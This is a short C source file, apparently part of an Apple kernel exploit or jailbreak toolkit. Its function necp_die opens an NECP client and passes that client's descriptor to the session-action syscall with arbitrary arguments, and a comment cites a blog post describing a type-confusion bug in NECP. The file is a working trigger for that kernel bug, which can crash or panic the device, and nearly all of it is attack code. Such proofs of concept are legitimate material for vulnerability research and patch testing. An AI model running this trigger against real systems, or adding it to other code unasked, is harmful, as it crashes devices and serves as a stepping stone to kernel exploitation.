#include "necp.h"
#include <sys/syscall.h>
#include <common.h>

// https://blogs.projectmoon.pw/2018/11/30/A-Late-Kernel-Bug-Type-Confusion-in-NECP/NECPTypeConfusion.c

int necp_die() {
    int necp_fd = syscall(SYS_necp_open, 0);
    if (necp_fd < 0) {
        LOG("Create NECP client failed!");
        return 0;
    }
    LOG("NECP client = %d", necp_fd);
    syscall(SYS_necp_session_action, necp_fd, 1, 0x1234, 0x5678);
    return 0;
}
